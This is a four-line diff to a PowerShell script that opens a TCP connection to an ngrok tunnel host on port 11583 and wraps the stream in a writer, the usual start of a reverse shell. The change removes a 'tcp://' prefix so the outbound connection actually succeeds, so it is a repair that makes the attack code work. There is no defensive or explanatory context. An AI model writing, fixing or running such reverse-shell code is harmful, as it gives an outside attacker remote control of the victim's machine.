@@ -1,4 +1,4 @@
-Set-Variable -Name socket -Value (new-object System.Net.Sockets.TcpClient('tcp://4.tcp.ngrok.io', 11583));
+Set-Variable -Name socket -Value (new-object System.Net.Sockets.TcpClient('4.tcp.ngrok.io', 11583));
 if($socket -eq $null){exit 1}
 Set-Variable -Name stream -Value ($socket.GetStream());
 Set-Variable -Name writer -Value (new-object System.IO.StreamWriter($stream));
